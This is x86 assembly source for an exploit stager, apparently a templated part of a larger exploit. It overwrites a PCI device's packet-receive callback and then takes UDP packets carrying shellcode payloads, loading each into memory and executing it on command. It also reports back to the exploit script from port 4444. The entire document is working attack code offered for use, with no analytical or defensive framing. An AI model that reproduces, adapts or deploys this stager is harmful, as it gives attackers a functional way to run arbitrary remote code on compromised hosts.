[bits 32]

; save pointer to session info structure for communications
mov ebp, [esp-968]

call get_eip
get_eip:
pop edi
sub edi, get_eip

; setup globals
mov [edi+session_data], ebp
mov dword [edi+payload_count], 0

; send a message to the exploit script so it knows the stager is running ok
push 0
push 'FEED'
mov ebx, esp
mov eax, 4
call send_packet

; setup the shellcode receiver- update the receive packet callback in the pci_device structure
mov esi, [ebp+8]
add edi, handleMessage
mov [esi+0x9f8], edi

; call recvLoop- note: does not return
push esi
mov eax, ${recvLoop}
call eax

; handle an incoming UDP packet
handleMessage:
 push ebp
 mov ebp, esp
 pusha

 call get_eip2
 get_eip2:
 pop edi
 sub edi, get_eip2
 mov edx, edi

 mov esi, [ebp+0x18]
 mov ebx, [esi+0]
 ; if the first DWORD is 0xdecoded, run the payloads we've collected
 cmp ebx, 0xdec0ded
 jz handleMessage_RunCode
 ; if the first DWORD is 0xc0dec0de, this packet contains a payload to load into memory and queue for execution
 cmp ebx, 0xc0dec0de
 jnz handleMessage_Done

 ; get the current payload index
 mov ecx, [edx+payload_count]

 ; get a pointer to the array of payload addresses
 add edi, [esi+8]
 add edi, payloads

 ; add the new payload to the list
 mov [edx+payload_ptrs+ecx*4], edi
 ; increment the payload counter
 inc ecx
 mov [edx+payload_count], ecx

 ; copy the payload data from the packet to it's specified relative load address
 mov ecx, [esi+4]
 add esi, 12
 rep movsb

handleMessage_Done:
 popa
 leave
 ret

handleMessage_RunCode:
 xor ecx, ecx
handleMessage_RunCode_Loop:
 ; for each of the received payloads, call them with the sessionInfo struct as an argument
 push edi
 push ecx
 push dword [edi+session_data]
 mov ebx, edi
 add ebx, payload_ptrs
 call [ebx+4*ecx]
 pop ecx
 pop ecx
 pop edi
 inc ecx
 cmp ecx, [edi+payload_count]
 jnz handleMessage_RunCode_Loop
 int3

send_packet:
 push eax		; len(payload)
 push ebx		; payload
 push dword [ebp+4]	; dstPort
 push dword [ebp+0]	; dstip
 push 4444		; srcPort
 push dword [ebp+8]	; pci_device*
 mov ebx, ${sendPkt}
 call ebx
 add esp, 4*6
 ret

session_data:
 resb 4

payload_count:
 resb 4

payload_ptrs:
 resd 16

payloads:

